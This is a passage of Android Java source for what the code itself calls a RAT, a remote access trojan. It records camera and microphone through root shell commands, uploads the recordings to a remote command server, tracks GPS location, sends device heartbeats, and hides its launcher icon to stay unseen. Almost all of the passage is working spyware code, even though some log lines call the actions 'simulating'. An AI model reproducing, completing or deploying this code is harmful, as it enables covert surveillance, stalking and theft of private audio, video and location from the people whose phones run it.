                try (InputStream inputStream = connection.getInputStream();
                     FileOutputStream outputStream = new FileOutputStream(downloadFile)) {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = inputStream.read(buffer)) != -1) {
                        outputStream.write(buffer, 0, bytesRead);
                    }
                    Log.d(TAG, "File downloaded successfully: " + downloadFile.getAbsolutePath());
                }
            } else {
                Log.w(TAG, "Failed to download file. Response code: " + responseCode);
            }
        } catch (IOException e) {
            Log.e(TAG, "Error downloading file: " + e.getMessage());
        }
    }

    private void deleteFile() {
        if (!allPermissionsGranted()) {
            Log.e(TAG, "Cannot delete file: Permissions not granted.");
            checkAndRequestPermissions();
            return;
        }
        Log.d(TAG, "Simulating file deletion...");
        String filePathToDelete = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/downloaded_sample.txt";
        File fileToDelete = new File(filePathToDelete);
        if (fileToDelete.exists()) {
            if (fileToDelete.delete()) {
                Log.d(TAG, "File deleted successfully: " + filePathToDelete);
            } else {
                Log.w(TAG, "Failed to delete file: " + filePathToDelete);
            }
        } else {
            Log.w(TAG, "File does not exist for deletion: " + filePathToDelete);
        }
    }

    private void startLiveCamera() {
        if (!allPermissionsGranted()) {
            Log.e(TAG, "Cannot start camera: Permissions not granted.");
            checkAndRequestPermissions();
            return;
        }
        Log.d(TAG, "Simulating live camera capture...");
        File cameraFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), "rat_camera_" + System.currentTimeMillis() + ".mp4");
        String absolutePath = cameraFile.getAbsolutePath();
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "ffmpeg -f v4l2 -i /dev/video0 -vcodec mpeg4 -b 800k -r 30 -s 640x480 -y " + absolutePath});
            int result = process.waitFor();
            Log.d(TAG, "ffmpeg process exited with code: " + result);
            if (cameraFile.exists() && cameraFile.length() > 0) {
                Log.d(TAG, "Camera capture started: " + cameraFile.getAbsolutePath());
                uploadFile(cameraFile, "camera");
            } else {
                Log.e(TAG, "Camera file not found or empty after capture. Ensure ffmpeg is installed and device has camera access.");
            }
        } catch (IOException | InterruptedException e) {
            Log.e(TAG, "Error starting live camera: " + e.getMessage());
        }
    }

    private void startLiveMic() {
        if (!allPermissionsGranted()) {
            Log.e(TAG, "Cannot start microphone: Permissions not granted.");
            checkAndRequestPermissions();
            return;
        }
        Log.d(TAG, "Simulating live microphone capture...");
        File micFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC), "rat_mic_" + System.currentTimeMillis() + ".wav");
        String absolutePath = micFile.getAbsolutePath();
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "arecord -D plughw:1,0 -f cd -t wav -r 44100 -c 2 -d 60 -o " + absolutePath});
            int result = process.waitFor();
            Log.d(TAG, "arecord process exited with code: " + result);
            if (micFile.exists() && micFile.length() > 0) {
                Log.d(TAG, "Microphone capture started: " + micFile.getAbsolutePath());
                uploadFile(micFile, "mic");
            } else {
                Log.e(TAG, "Microphone file not found or empty after capture. Ensure audio capture is set up correctly.");
            }
        } catch (IOException | InterruptedException e) {
            Log.e(TAG, "Error starting live microphone: " + e.getMessage());
        }
    }

    private void stopLiveCamera() {
        Log.d(TAG, "Stopping live camera capture...");
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "pkill ffmpeg"});
            int result = process.waitFor();
            Log.d(TAG, "ffmpeg process killed with code: " + result);
        } catch (IOException | InterruptedException e) {
            Log.e(TAG, "Error stopping live camera: " + e.getMessage());
        }
    }

    private void stopLiveMic() {
        Log.d(TAG, "Stopping live microphone capture...");
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "pkill arecord"});
            int result = process.waitFor();
            Log.d(TAG, "arecord process killed with code: " + result);
        } catch (IOException | InterruptedException e) {
            Log.e(TAG, "Error stopping live microphone: " + e.getMessage());
        }
    }

    private void hideIcon() {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, MAIN_ACTIVITY_NAME);
        pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        Log.d(TAG, "App icon hidden.");
    }

    private void showIcon() {
        PackageManager pm = getPackageManager();
        ComponentName componentName = new ComponentName(this, MAIN_ACTIVITY_NAME);
        pm.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        Log.d(TAG, "App icon shown.");
    }

    private void uploadFile(File file, String type) {
        if (!file.exists()) {
            Log.e(TAG, "File to upload does not exist: " + file.getAbsolutePath());
            return;
        }
        if (SERVER_IP == null || FLASK_PORT == null || uniqueDeviceId == null) {
            Log.w(TAG, "Server IP/Flask Port not obtained, or Device ID not loaded, cannot upload file.");
            return;
        }
        HttpURLConnection connection = null;
        DataOutputStream dos = null;
        FileInputStream fileInputStream = null;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****" + System.currentTimeMillis() + "*****";
        try {
            URL url = new URL("http://" + SERVER_IP + ":" + FLASK_PORT + "/api/upload_" + type + "/" + uniqueDeviceId);
            connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("ENCTYPE", "multipart/form-data");
            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            connection.setRequestProperty(type, file.getName());
            connection.setConnectTimeout(30000);
            connection.setReadTimeout(30000);
            dos = new DataOutputStream(connection.getOutputStream());
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"" + type + "\"; filename=\"" + file.getName() + "\"" + lineEnd);
            String contentType = "application/octet-stream";
            if (type.equals("screenshot")) contentType = "image/png";
            if (type.equals("camera")) contentType = "video/mp4";
            if (type.equals("mic")) contentType = "audio/wav";
            dos.writeBytes("Content-Type: " + contentType + lineEnd);
            dos.writeBytes(lineEnd);
            fileInputStream = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, type + " uploaded successfully.");
            } else {
                Log.w(TAG, "Server responded with non-OK code for " + type + " upload: " + responseCode);
                try (BufferedReader in = new BufferedReader(new InputStreamReader(connection.getErrorStream()))) {
                    String line;
                    StringBuilder response = new StringBuilder();
                    while ((line = in.readLine()) != null) {
                        response.append(line);
                    }
                    Log.w(TAG, "Error response: " + response.toString());
                }
            }
        } catch (IOException e) {
            Log.e(TAG, "Failed to upload " + type + " for device " + uniqueDeviceId + ": " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private void startLocationUpdates() {
        if (!allPermissionsGranted()) {
            Log.e(TAG, "Cannot start location updates: Permissions not granted.");
            return;
        }
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    locationManager.requestLocationUpdates(
                            LocationManager.GPS_PROVIDER,
                            Long.parseLong(LOCATION_UPDATE_INTERVAL),
                            Float.parseFloat(LOCATION_UPDATE_DISTANCE),
                            locationListener,
                            handler.getLooper());
                    Log.d(TAG, "Requested GPS location updates.");
                } else {
                    Log.w(TAG, "GPS provider not enabled.");
                }
                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    locationManager.requestLocationUpdates(
                            LocationManager.NETWORK_PROVIDER,
                            Long.parseLong(LOCATION_UPDATE_INTERVAL),
                            Float.parseFloat(LOCATION_UPDATE_DISTANCE),
                            locationListener,
                            handler.getLooper());
                    Log.d(TAG, "Requested Network location updates.");
                } else {
                    Log.w(TAG, "Network provider not enabled.");
                }
            } else {
                Log.e(TAG, "Location permissions not granted!");
            }
        } catch (SecurityException e) {
            Log.e(TAG, "SecurityException requesting location updates: " + e.getMessage());
        }
    }

    private void stopLocationUpdates() {
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
            Log.d(TAG, "Location updates stopped.");
        }
    }

    private void sendHeartbeat() {
        String targetIp = SERVER_IP;
        String targetPort = FLASK_PORT;
        if (targetIp == null || targetPort == null || uniqueDeviceId == null) {
            Log.w(TAG, "Server IP/Flask Port not loaded or Device ID not ready, cannot send heartbeat.");
            return;
        }
        HttpURLConnection connection = null;
        try {
            URL url = new URL("http://" + targetIp + ":" + targetPort + "/api/heartbeat/" + uniqueDeviceId);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            connection.setDoOutput(true);
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("device_id", uniqueDeviceId);
            jsonObject.put("rat_version", "1.0");
            jsonObject.put("device_type", Build.MODEL);
            try (OutputStream os = connection.getOutputStream()) {
                os.write(jsonObject.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
            }
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, "Heartbeat sent successfully for device: " + uniqueDeviceId);
            } else {
                Log.w(TAG, "Server responded with non-OK code for heartbeat: " + responseCode);
            }
        } catch (IOException | JSONException e) {
            Log.e(TAG, "Failed to send heartbeat for device " + uniqueDeviceId + ": " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
}